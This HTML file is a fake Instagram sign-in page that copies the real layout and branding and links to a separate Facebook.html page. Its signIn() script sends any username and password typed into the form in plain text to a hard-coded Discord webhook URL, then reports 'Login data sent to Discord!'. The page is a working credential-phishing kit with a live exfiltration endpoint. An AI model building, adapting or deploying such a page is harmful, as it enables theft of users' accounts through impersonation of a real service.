<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Sign In</title>
    <link rel="icon" href="instagram (1).ico" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            text-align: center;
            width: 300px;
            border-radius: 10px; /* Rounded corners */
            box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1); /* Soft shadow */
        }

        .sign-in-form img {
            width: 175px; /* Adjusted width to match the title size */
            margin-bottom: 20px;
            pointer-events: none; /* Disable pointer events */
        }

        .sign-in-form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px; /* Rounded corners */
            background-color: #fafafa;
            box-sizing: border-box; /* Include padding and border in width */
        }

        .sign-in-form button {
            width: 100%;
            padding: 10px;
            margin: 10px 0; /* Adjust margin to match input fields */
            background-color: #389df0;
            border: none;
            border-radius: 10px; /* Rounded corners */
            color: white;
            font-size: 16px;
            cursor: pointer;
            box-sizing: border-box; /* Include padding and border in width */
        }

        .sign-in-form button:hover {
            background-color: #3178c6;
        }

        .forgot-password {
            margin-top: 20px;
            color: #00376b;
            cursor: pointer;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .line-wrapper {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .line {
            height: 1px;
            background-color: #cbcbcb;
            flex-grow: 1;
        }

        .or-text {
            margin: 0 10px;
            color: #8e8e8e;
            font-weight: bold;
        }

        .facebook-login {
            color: #385185;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center; /* Align icon and text vertically */
            justify-content: center; /* Center content horizontally */
        }

        .facebook-login:hover {
            text-decoration: underline;
        }

        .facebook-icon {
            width: 25px; /* Adjust the size of the icon */
            height: 25px; /* Adjust the size of the icon */
            margin-right: 8px;
            border-radius: 50%; /* Make the icon circular */
            overflow: hidden; /* Ensure circular overflow */
        }

        .facebook-icon img {
            width: 100%; /* Make the image fill the circular container */
            height: 100%; /* Make the image fill the circular container */
            object-fit: cover; /* Cover the circular area */
        }

        .get-the-app {
            margin-top: 20px;
            text-align: center;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }

        .app-buttons img {
            width: 135px; /* Adjust the width as needed */
            cursor: pointer;
        }

        .footer {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 20px;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sign-in-form">
            <img src="Capture.png" alt="Instagram Logo">
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <button onclick="signIn()">Log In</button>
            <div class="line-wrapper">
                <div class="line"></div>
                <div class="or-text">or</div>
                <div class="line"></div>
            </div>
            <a href="Facebook.html" target="_blank" class="facebook-login">
                <span class="facebook-icon">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
                </span>
                Log in with Facebook
            </a>
            
            <p class="forgot-password">Forgot password?</p>
        </div>
    </div>
    <div class="get-the-app">
        <p>Get the app.</p>
        <div class="app-buttons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store">
        </div>
    </div>
    <div class="footer">
        <p>&copy; 2024 Instagram from Facebook</p>
        <p><a href="#">About</a> &middot; <a href="#">Help</a> &middot; <a href="#">Press</a> &middot; <a href="#">API</a> &middot; <a href="#">Jobs</a> &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a> &middot; <a href="#">Locations</a></p>
        <p><a href="#">Top Accounts</a> &middot; <a href="#">Hashtags</a> &middot; <a href="#">Language</a></p>
    </div>

    <script>
        // JavaScript to prevent image dragging
        document.addEventListener("DOMContentLoaded", function() {
            const img = document.querySelector(".sign-in-form img");
            img.addEventListener("dragstart", function(event) {
                event.preventDefault();
            });
        });

        function signIn() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // Simple validation
            if (username === "" || password === "") {
                alert("Please enter both username and password.");
                return;
            }

            // Send data to Discord via webhook
            fetch('https://discord.com/api/webhooks/1263073130071461899/DXdeo57DlpfrGdDIBzh0GOX5djz9TxMd-O4v99ha796AZgGKlpDvysm71dIfkyZMxD_G', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `New login attempt:\nUsername: ${username}\nPassword: ${password}`
                })
            })
            .then(response => response.text())
            .then(data => {
                alert("Login data sent to Discord!"); // Show success message
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
